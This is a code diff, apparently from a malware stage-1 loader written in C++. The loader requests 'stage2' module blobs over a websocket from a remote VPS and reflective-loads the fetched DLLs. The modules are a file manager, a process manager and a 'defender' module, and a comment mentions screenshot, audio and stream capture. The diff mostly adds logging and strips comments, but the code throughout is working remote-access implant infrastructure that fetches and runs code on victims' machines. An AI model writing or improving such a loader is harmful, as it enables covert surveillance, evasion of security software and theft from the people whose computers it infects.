@@ -225,6 +225,7 @@ public:
         // Send request: {"cmd":"stage2_fetch","id":"...","module":"..."}
         std::string j = "{\"cmd\":\"stage2_fetch\",\"id\":\"" + req_id +
                         "\",\"module\":\"" + module_name + "\"}";
+        stage1_log(0, ("stage2: fetch_blob_sync sending " + module_name + " id=" + req_id).c_str());
         stage1_ws_send(j.c_str());
 
         // Wait for response.
@@ -302,30 +303,27 @@ public:
     // (screenshot, audio, stream, filemgr, procmgr, defender). Safe to call
     // repeatedly — concurrent calls share the same thread once it finishes.
     void prefetch_all_async() {
-        if (prefetch_running_.exchange(true)) return;
+        if (prefetch_running_.exchange(true)) {
+            stage1_log(2, "stage2: prefetch already running, skipping");
+            return;
+        }
+        stage1_log(1, "stage2: prefetch_all_async starting");
         std::thread([this]{
-            // Wipe any stale blobs from previous (possibly crashed) runs.
-            // shutdown_all already does this on graceful stop, but on a hard
-            // kill / forced reboot / DLL update the .bin files can linger.
-            // They may be encrypted with a stale key, so trusting them would
-            // cause decrypt failures. Always start fresh.
             wipe_cache_dir();
-
-            // Only the modules that actually ship as stage-2 DLLs today.
-            // Keeping screenshot/audio/stream here previously meant three
-            // round-trips to the VPS at every startup for modules that
-            // don't exist, each fast-failing but still over the network.
-            // Add a name to this list when its .bin ships with the VPS.
-            static const char* kModules[] = {
-                "filemgr", "procmgr", "defender"
-            };
+            static const char* kModules[] = { "filemgr", "procmgr", "defender" };
             for (auto m : kModules) {
-                // 1) fetch the blob (cache was just wiped, so always fetches)
-                if (!fetch_blob_sync(m, 15000)) continue;  // VPS doesn't have it
-                // 2) reflective-load so the module's commands register.
-                ensure_loaded(m);
+                std::string name = m;
+                stage1_log(1, ("stage2: prefetch begin " + name).c_str());
+                bool fetched = fetch_blob_sync(m, 15000);
+                stage1_log(1, ("stage2: prefetch fetch_blob_sync " + name +
+                              " -> " + (fetched ? "OK" : "FAIL")).c_str());
+                if (!fetched) continue;
+                bool loaded = ensure_loaded(m);
+                stage1_log(1, ("stage2: prefetch ensure_loaded " + name +
+                              " -> " + (loaded ? "OK" : "FAIL")).c_str());
             }
             prefetch_running_.store(false);
+            stage1_log(1, "stage2: prefetch_all_async done");
         }).detach();
     }
 
